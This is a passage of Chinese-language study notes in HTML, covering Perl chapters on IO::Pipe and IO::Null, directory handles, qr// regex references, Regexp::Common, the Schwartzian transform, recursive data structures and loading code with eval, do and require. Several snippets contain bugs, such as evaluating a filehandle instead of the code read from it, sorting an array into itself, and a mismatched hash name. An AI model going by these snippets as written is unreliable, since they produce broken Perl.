class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> IO::Pipe;<br><br><span class="hljs-keyword">my</span> $pipe = IO::Pipe-&gt;new;<br><br>$pipe-&gt;reader( <span class="hljs-string">&quot;$^X -V&quot;</span> );  <span class="hljs-comment"># $^X is the current perl executable</span><br><br><span class="hljs-keyword">while</span> ( &lt;$pipe&gt; ) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Read: $_&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>命令就写在 <code>reader()</code> 中.</p><p>写入:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> IO::Pipe;<br><br><span class="hljs-keyword">my</span> $pipe = IO::Pipe-&gt;new;<br><br>$pipe-&gt;writer( $command );<br><br><span class="hljs-keyword">foreach</span> ( <span class="hljs-number">1</span> .. <span class="hljs-number">10</span> ) &#123;<br>    <span class="hljs-keyword">print</span> $pipe <span class="hljs-string">&quot;I can count to $_\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="8-5-5-IO-Null-模块和-IO-Interactive-模块"><a href="#8-5-5-IO-Null-模块和-IO-Interactive-模块" class="headerlink" title="8.5.5 IO::Null 模块和 IO::Interactive 模块"></a>8.5.5 IO::Null 模块和 IO::Interactive 模块</h3><p>使用 IO::Null 模块创建一个文件句柄用于丢弃所提供的内容, 如 <code>/dev/null</code>.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> IO::Null;<br><br><span class="hljs-keyword">my</span> $null_fn = IO::Null-&gt;new;<br><br>some_printing_thing( $null_fn, @args );<br></code></pre></td></tr></table></figure><p>如:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> IO::Null;<br><br><span class="hljs-keyword">my</span> $debug_fn = $Debug ? *STDOUT : IO::Null-&gt;new;<br><br>$debug_fn-&gt;<span class="hljs-keyword">print</span>( <span class="hljs-string">&quot;Hey, the radio&#x27;s not working&quot;</span> );<br></code></pre></td></tr></table></figure><h2 id="8-6-目录句柄"><a href="#8-6-目录句柄" class="headerlink" title="8.6 目录句柄"></a>8.6 目录句柄</h2><p>与创建文件句柄引用的方式一致:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">opendir</span> <span class="hljs-keyword">my</span> $dh, <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Could not open directory: $!&quot;</span>;<br><br><span class="hljs-keyword">foreach</span> <span class="hljs-keyword">my</span> $file ( <span class="hljs-keyword">readdir</span>( $dh ) ) &#123;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Skipper, I found $file!\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="目录句柄引用"><a href="#目录句柄引用" class="headerlink" title="目录句柄引用"></a>目录句柄引用</h3><p>自 v5.6 起, IO::Dir 模块就成为 Perl 标准发行版的一部分.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> IO::Dir;<br><br><span class="hljs-keyword">my</span> $dir_fh = IO::Dir-&gt;new( <span class="hljs-string">&#x27;.&#x27;</span> )<br>    <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Could not open dirhandle! $!&quot;</span>;<br></code></pre></td></tr></table></figure><h1 id="第9章-正则表达式引用"><a href="#第9章-正则表达式引用" class="headerlink" title="第9章 正则表达式引用"></a>第9章 正则表达式引用</h1><h2 id="9-1-正则表达式引用之前"><a href="#9-1-正则表达式引用之前" class="headerlink" title="9.1 正则表达式引用之前"></a>9.1 正则表达式引用之前</h2><p>用 eval 语句在匹配时捕获可能发生的错误:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Enter a pattern: &#x27;</span>;<br><span class="hljs-keyword">chomp</span>( <span class="hljs-keyword">my</span> $pattern = &lt;STDIN&gt; );<br><br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Enter some lines:\n&quot;</span>;<br><span class="hljs-keyword">while</span>(&lt;STDIN&gt;) &#123;<br>    <span class="hljs-keyword">if</span>( <span class="hljs-keyword">eval</span> &#123; <span class="hljs-regexp">m/$pattern/</span> &#125; ) &#123;<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Match: $_&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>($@) &#123;<br>        <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;There was a regex problem: $@\n&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在尝试使用一个模式之前, 编写一个子例程测试该模式:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">is_valid_pattern</span> </span>&#123;<br>    <span class="hljs-keyword">my</span>( $pattern ) = @_;<br>    <span class="hljs-keyword">local</span>( $@ );<br><br>    <span class="hljs-keyword">eval</span> &#123; <span class="hljs-string">&#x27;&#x27;</span> =~ <span class="hljs-regexp">/$pattern/</span> &#125;;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">defined</span> $@ ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>但这样仍然不太好.</p><h2 id="9-2-预编译模式"><a href="#9-2-预编译模式" class="headerlink" title="9.2 预编译模式"></a>9.2 预编译模式</h2><p>Perl v5.5 引入一个新的引用机制: <code>qr//</code> 操作符. 这里的预编译应该是说其产生的引用会在预编译时展开.</p><p><code>qr</code> 是 regex quote.</p><p>提供一个编译完成的正则表达式的引用:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $regex = <span class="hljs-regexp">qr/Gilligan|Skipper/</span>;<br><span class="hljs-keyword">print</span> $regex;<br></code></pre></td></tr></table></figure><p>在 perlop 文档中可查看 “引号和类引号操作符”.</p><p>分隔符可换 (<code>qr//</code>, 改为 <code>qr()</code> 之类的).</p><p>可以添加 options :</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$rex = <span class="hljs-regexp">qr/my.STRING/is</span>;<br></code></pre></td></tr></table></figure><h3 id="9-2-1-正则表达式选项"><a href="#9-2-1-正则表达式选项" class="headerlink" title="9.2.1 正则表达式选项"></a>9.2.1 正则表达式选项</h3><p>特殊序列 <code>(?flags:pattern)</code> 允许在模式本身中指定修饰符 (也就是说不把标志写在末尾, 而是在正则表达式之中):</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">qr/(?mi:Gilligan$)/;<br></code></pre></td></tr></table></figure><p>分组;</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">qr/abc(?i:Gilligan)def/;<br></code></pre></td></tr></table></figure><p>能够在标记之前添加一个 “-“, 从一部分模式中移除修饰符:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">qr/abc(?-i:Gilligan)def/i;<br></code></pre></td></tr></table></figure><p>同时添加和移除:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">qr/abc(?<span class="hljs-keyword">x</span>-i:G i l l i g a n)def/i;<br></code></pre></td></tr></table></figure><h3 id="9-2-2-应用正则表达式引用"><a href="#9-2-2-应用正则表达式引用" class="headerlink" title="9.2.2 应用正则表达式引用"></a>9.2.2 应用正则表达式引用</h3><p>直接插入:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $regex = <span class="hljs-regexp">qr/Gilligan/</span>;<br>$string =~ <span class="hljs-regexp">m/$regex/</span>;<br>$string =~ <span class="hljs-regexp">s/$regex/Skipper/</span>;<br></code></pre></td></tr></table></figure><p>直接绑定:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$string =~ $regex;<br></code></pre></td></tr></table></figure><p>智能匹配:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$string ~~ $regex;<br></code></pre></td></tr></table></figure><h2 id="9-3-作为标量的正则表达式"><a href="#9-3-作为标量的正则表达式" class="headerlink" title="9.3 作为标量的正则表达式"></a>9.3 作为标量的正则表达式</h2><p>可将其存储在数组和散列中, 作为参数传递给子例程.</p><p>使用 List::Util 模块中的 <code>first</code> 函数:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">10.1</span>;<br><span class="hljs-keyword">use</span> List::Util <span class="hljs-string">qw(first)</span>;<br><br><span class="hljs-keyword">my</span> %patterns = (<br>    <span class="hljs-string">Gilligan   =&gt;</span> qr/(?:Willie )?Gilligan/,<br>    <span class="hljs-string">&#x27;Mary Ann&#x27;</span> =&gt; <span class="hljs-regexp">qr/Mary Ann/</span>,<br>    <span class="hljs-string">Ginger     =&gt;</span> qr/Ginger/,<br>    <span class="hljs-string">Professor  =&gt;</span> qr/(?:The )?Professor/,<br>    <span class="hljs-string">Skipper    =&gt;</span> qr/Skipper/,<br>    <span class="hljs-string">&#x27;A Howell&#x27;</span> =&gt; <span class="hljs-regexp">qr/Mrs?. Howell/</span>,<br>);<br><br><span class="hljs-keyword">my</span> $name = <span class="hljs-string">&#x27;Ginger&#x27;</span>;<br><br><span class="hljs-keyword">my</span>( $match ) = first &#123; $name =~ $pattern&#123;$_&#125; &#125; <span class="hljs-keyword">keys</span> %patterns;<br><br><span class="hljs-keyword">say</span> <span class="hljs-string">&quot;Matched $match&quot;</span> <span class="hljs-keyword">if</span> $match;<br></code></pre></td></tr></table></figure><h2 id="9-4-建立正则表达式"><a href="#9-4-建立正则表达式" class="headerlink" title="9.4 建立正则表达式"></a>9.4 建立正则表达式</h2><p>将模式插入其他模式之中:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $howells    = <span class="hljs-regexp">qr/Thurston|Mrs/</span>;<br><span class="hljs-keyword">my</span> $tagalongs  = <span class="hljs-regexp">qr/Ginger|Mary Ann/</span>;<br><span class="hljs-keyword">my</span> $passengers = <span class="hljs-regexp">qr/$howells|$tagalongs/</span>;<br><span class="hljs-keyword">my</span> $crew       = <span class="hljs-regexp">qr/Gilligan|Skipper/</span>;<br><br><span class="hljs-keyword">my</span> $everyone   = <span class="hljs-regexp">qr/$crew|$passengers/</span>;<br></code></pre></td></tr></table></figure><h2 id="9-5-创建正则表达式的模块"><a href="#9-5-创建正则表达式的模块" class="headerlink" title="9.5 创建正则表达式的模块"></a>9.5 创建正则表达式的模块</h2><h3 id="9-5-1-使用常见的模式"><a href="#9-5-1-使用常见的模式" class="headerlink" title="9.5.1 使用常见的模式"></a>9.5.1 使用常见的模式</h3><p>能够直接使用 Regexp::Common 模块提供的某个模式.</p><p>该模块导出一个叫做 <code>$RE</code> 的散列引用, 它以我们所需要的正则表达式引用作为其值:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">10.1</span>;<br><span class="hljs-keyword">use</span> Regexp::Common <span class="hljs-string">qw(URI)</span>;<br><br><span class="hljs-keyword">while</span>( &lt;&gt; ) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-keyword">if</span> /$RE<span class="hljs-string">&#123;URL&#125;</span><span class="hljs-string">&#123;HTTP&#125;</span>/;<br>&#125;<br></code></pre></td></tr></table></figure><p>若查找 IPv4 地址, 能够使用该模块的 net 工具衍生出的一个模式:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">10.1</span>;<br><span class="hljs-keyword">use</span> Regexp::Common <span class="hljs-string">qw(net)</span>;<br><br><span class="hljs-keyword">while</span>( &lt;&gt; ) &#123;<br>    <span class="hljs-keyword">say</span> <span class="hljs-keyword">if</span> /$RE<span class="hljs-string">&#123;net&#125;</span><span class="hljs-string">&#123;IPv4&#125;</span>/;<br>&#125;<br></code></pre></td></tr></table></figure><p>匹配数字:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">10.1</span>;<br><span class="hljs-keyword">use</span> Regexp::Common <span class="hljs-string">qw(number)</span>;<br><br><span class="hljs-keyword">while</span>( &lt;&gt; ) &#123;<br>    <span class="hljs-keyword">say</span> <span class="hljs-keyword">if</span> /$RE<span class="hljs-string">&#123;num&#125;</span><span class="hljs-string">&#123;int&#125;</span>/;<br>&#125;<br></code></pre></td></tr></table></figure><p>可查询 perltie 文档, 查看关于 <code>tie</code> 的信息.</p><p>具体看书.</p><h3 id="9-5-2-组装正则表达式"><a href="#9-5-2-组装正则表达式" class="headerlink" title="9.5.2 组装正则表达式"></a>9.5.2 组装正则表达式</h3><p>Regexp::Assemble 模块可用于建立高效的则一匹配.</p><h1 id="第10章-实用的引用技巧"><a href="#第10章-实用的引用技巧" class="headerlink" title="第10章 实用的引用技巧"></a>第10章 实用的引用技巧</h1><p>注意 sort 函数对数字的排序, 其会按照字符串的顺序进行排序. 如, 任何以 3 开头的字符串都放置于 4 开头的字符串之前.</p><p>升序:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @numerically_ascending = <span class="hljs-keyword">sort</span> &#123; $a &lt;=&gt; $b &#125; <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">32</span>, <span class="hljs-number">16</span>;<br></code></pre></td></tr></table></figure><p>降序:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @numerically_descending = <br>    <span class="hljs-keyword">reverse</span> <span class="hljs-keyword">sort</span> &#123; $a &lt;=&gt; $b &#125; <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">16</span>, <span class="hljs-number">32</span>;<br></code></pre></td></tr></table></figure><h2 id="10-2-用索引排序"><a href="#10-2-用索引排序" class="headerlink" title="10.2 用索引排序"></a>10.2 用索引排序</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @input = <span class="hljs-string">qw(Gilligan Skipper Professor Ginger Mary Ann)</span>;<br><span class="hljs-keyword">my</span> @sorted_positions = <br>    <span class="hljs-keyword">sort</span> &#123; $input[$a] cmp $input[$b] &#125; <span class="hljs-number">0</span> .. $#input;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;@sorted_positions\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>也就是说利用索引排序 (<code>$a</code> 和 <code>$b</code> 的值为数组的索引), 结果仍然是按照 ASCII 的顺序.</p><p><code>$#input</code> 表示数组的最有一个索引.</p><h2 id="10-3-更为高效的排序"><a href="#10-3-更为高效的排序" class="headerlink" title="10.3 更为高效的排序"></a>10.3 更为高效的排序</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @names_and_pineapples = <span class="hljs-keyword">map</span> &#123;<br>  [ $_, ask_monkey_about($_) ] <br>&#125; @castways;<br><br><span class="hljs-keyword">my</span> @sorted_names_and_pineapples = <span class="hljs-keyword">sort</span> &#123;<br>  $b-&gt;[<span class="hljs-number">1</span>] &lt;=&gt; $a-&gt;[<span class="hljs-number">1</span>];<br>&#125; @sorted_names_and_pineapples;<br></code></pre></td></tr></table></figure><h2 id="10-4-施瓦茨变换"><a href="#10-4-施瓦茨变换" class="headerlink" title="10.4 施瓦茨变换"></a>10.4 施瓦茨变换</h2><p>如这种结构:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @names = <br>    <span class="hljs-keyword">map</span> $_-&gt;[<span class="hljs-number">0</span>],<br>    <span class="hljs-keyword">sort</span> &#123; $b-&gt;[<span class="hljs-number">1</span>] &lt;=&gt; $a-&gt;[<span class="hljs-number">1</span>] &#125;<br>    <span class="hljs-keyword">map</span> [ $_, ask_monkey_about($_) ],<br>    @castways;<br></code></pre></td></tr></table></figure><p>基本语法结构:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @output_data = <br>  <span class="hljs-keyword">map</span>  &#123; EXTRACTION &#125;,<br>  <span class="hljs-keyword">sort</span> &#123; COMPARISON &#125;<br>  <span class="hljs-keyword">map</span>  [ CONSTRUCTION ],<br>  @input_data;<br></code></pre></td></tr></table></figure><h2 id="10-5-使用施瓦茨变换实线多级排序"><a href="#10-5-使用施瓦茨变换实线多级排序" class="headerlink" title="10.5 使用施瓦茨变换实线多级排序"></a>10.5 使用施瓦茨变换实线多级排序</h2><h2 id="10-6-递归定义的数据"><a href="#10-6-递归定义的数据" class="headerlink" title="10.6 递归定义的数据"></a>10.6 递归定义的数据</h2><p>如:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">factorial</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $n = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">if</span> ($n &lt;= <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> $n * factorial($n -<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="10-7-构建递归定义的数据"><a href="#10-7-构建递归定义的数据" class="headerlink" title="10.7 构建递归定义的数据"></a>10.7 构建递归定义的数据</h2><p>如:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $skipper_home = &#123;<br>    <span class="hljs-string">&#x27;.cshrc&#x27;</span>                      =&gt; <span class="hljs-keyword">undef</span>,<br>    <span class="hljs-string">&#x27;Please_rescue_us.pdf&#x27;</span>        =&gt; <span class="hljs-keyword">undef</span>,<br>    <span class="hljs-string">&#x27;Things_I_should_have_packed&#x27;</span> =&gt; <span class="hljs-keyword">undef</span>,<br><br>    <span class="hljs-string">bin =&gt;</span> &#123;<br>        <span class="hljs-string">navigate                   =&gt;</span> <span class="hljs-keyword">undef</span>,<br>        <span class="hljs-string">discipline_gilligan        =&gt;</span> <span class="hljs-keyword">undef</span>,<br>        <span class="hljs-string">eat                        =&gt;</span> <span class="hljs-keyword">undef</span>,<br>    &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>获取数据并形成结构:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">data_for_path</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $path = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">if</span> (-f $path <span class="hljs-keyword">or</span> -l $path) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">undef</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (-d $path) &#123;<br>        <span class="hljs-keyword">my</span> %directory;<br>        <span class="hljs-keyword">opendir</span> PATH, $path <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot opendir $path: $!&quot;</span>;<br>        <span class="hljs-keyword">my</span> @names = <span class="hljs-keyword">readdir</span> PATH;<br>        <span class="hljs-keyword">closedir</span> PATH;<br>        <span class="hljs-keyword">for</span> <span class="hljs-keyword">my</span> $name (@names) &#123;<br>            <span class="hljs-keyword">next</span> <span class="hljs-keyword">if</span> $name eq <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">or</span> $name eq <span class="hljs-string">&#x27;..&#x27;</span>;<br>            $directory&#123;$name&#125; = data_for_path(<span class="hljs-string">&quot;$path/$name&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> \%directory;<br>    &#125;<br>    <span class="hljs-keyword">warn</span> <span class="hljs-string">&quot;$path is neither a file nor a directory\n&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">undef</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>检查结果:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Data::Dumper;<br><span class="hljs-keyword">print</span> Dumper(data_for_path(<span class="hljs-string">&#x27;.&#x27;</span>));<br></code></pre></td></tr></table></figure><h2 id="10-8-显示递归定义的数据"><a href="#10-8-显示递归定义的数据" class="headerlink" title="10.8 显示递归定义的数据"></a>10.8 显示递归定义的数据</h2><h2 id="10-9-避免递归"><a href="#10-9-避免递归" class="headerlink" title="10.9 避免递归"></a>10.9 避免递归</h2><p>使用迭代解决问题.</p><h1 id="第11章-构建更大型的程序"><a href="#第11章-构建更大型的程序" class="headerlink" title="第11章 构建更大型的程序"></a>第11章 构建更大型的程序</h1><h2 id="11-1-修改通用代码"><a href="#11-1-修改通用代码" class="headerlink" title="11.1 修改通用代码"></a>11.1 修改通用代码</h2><p>大多数用 <code>shift</code> 来获取参数.</p><h2 id="11-2-使用-eval-插入代码"><a href="#11-2-使用-eval-插入代码" class="headerlink" title="11.2 使用 eval 插入代码"></a>11.2 使用 eval 插入代码</h2><p>将代码放入如 <code>Navigation.pm</code> 的独立文件中, 该文件由所需的多个子例程组成. (<code>.pm</code> 即 Perl Module)</p><p>用硬编码 (即直接将数据写到源代码中), 用 <code>eval</code> 的字符串形式 (可以理解为字符串被当作代码编译):</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">load_common_subroutines</span> </span>&#123;<br>    <span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $more_fh, <span class="hljs-string">&#x27;&lt;&#x27;</span>, <span class="hljs-string">&#x27;Navigation.pm&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Navigation.pm: $!&quot;</span>;<br>    <span class="hljs-keyword">undef</span> $/;<br>    <span class="hljs-keyword">my</span> $more_code = &lt;$more_fh&gt;;<br>    <span class="hljs-keyword">close</span> $more_fh;<br>    <span class="hljs-keyword">eval</span> $more_fh;<br>    <span class="hljs-keyword">die</span> $@ <span class="hljs-keyword">if</span> $@;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="11-3-使用-do-语句"><a href="#11-3-使用-do-语句" class="headerlink" title="11.3 使用 do 语句"></a>11.3 使用 do 语句</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">do</span> <span class="hljs-string">&#x27;Navigation.pm&#x27;</span>;<br><span class="hljs-keyword">die</span> $@ <span class="hljs-keyword">if</span> $@;<br></code></pre></td></tr></table></figure><p><code>do</code> 操作符的功能就像是把 <code>Navigation.pm</code> 的代码合并进当前程序中, 尽管导入的变量还在它自己的作用域语句块中. (即里面是它自己的作用域, 如 <code>my</code> 和 <code>use</code> 不会和主程序冲突);</p><h2 id="11-4-使用-require-语句"><a href="#11-4-使用-require-语句" class="headerlink" title="11.4 使用 require 语句"></a>11.4 使用 require 语句</h2><p><code>require</code> 可以追踪哪些文件已经导入, 然后仅导入一次.</p><p>特性:</p><ul><li>导入文件中的任何语法错误都将终止程序, 所以不再需要很多 <code>die $@ if $@</code></li><li>文件中的最后一个求值表达式必须返回一个真值</li></ul><p>因此, 大多数用于 <code>require</code> 导入的文件中, 最后一行代码总有一个 <code>1</code> (来确保最后的求值表达式为真).</p><h2 id="11-5-命名空间冲突的问题"><a href="#11-5-命名空间冲突的问题" class="headerlink" title="11.5 命名空间冲突的问题"></a>11.5 命名空间冲突的问题</h2><h2 id="11-6-使用包作为命名空间分隔符"><a href="#11-6-使用包作为命名空间分隔符" class="headerlink" title="11.6 使用包作为命名空间分隔符"></a>11.6 使用包作为命名空间分隔符</h2><p>用 <code>package</code> 命令. (用在模块中, 而不是你要调用模块的文件)</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Navigation;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span 